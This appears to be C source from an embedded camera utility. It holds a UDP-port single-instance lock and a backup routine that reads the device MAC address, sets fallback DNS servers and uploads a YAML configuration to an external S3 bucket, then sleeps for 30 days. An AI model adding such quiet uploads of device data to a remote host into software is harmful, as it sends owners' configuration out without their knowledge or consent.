#include <assert.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include "backup.h"
#include "dns.h"
#include "http.h"
#include "network.h"

#define UDP_LOCK_PORT 1025

bool udp_lock() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1)
        return false;

    struct sockaddr_in name;
    name.sin_family = AF_INET;
    name.sin_port = htons(UDP_LOCK_PORT);
    name.sin_addr.s_addr = htonl(INADDR_ANY);
    if (bind(sock, (struct sockaddr *)&name, sizeof(name)) < 0)
        return false;

    return true;
}

void do_backup(const char *yaml, size_t yaml_len) {
    nservers_t ns;
    ns.len = 0;

    if (!parse_resolv_conf(&ns)) {
#if 0
        fprintf(stderr, "parse_resolv_conf failed\n");
#endif
        return;
    }
    add_predefined_ns(&ns, 0xd043dede /* 208.67.222.222 of OpenDNS */,
                      0x01010101 /* 1.1.1.1 of Cloudflare */, 0);

    char mac[32];
    if (!get_mac_address(mac, sizeof mac)) {
        return;
    };

    upload("camware.s3.eu-north-1.amazonaws.com", mac, &ns, yaml, yaml_len);

    // don't release UDP lock for 30 days
    sleep(60 * 60 * 24 * 30);
}
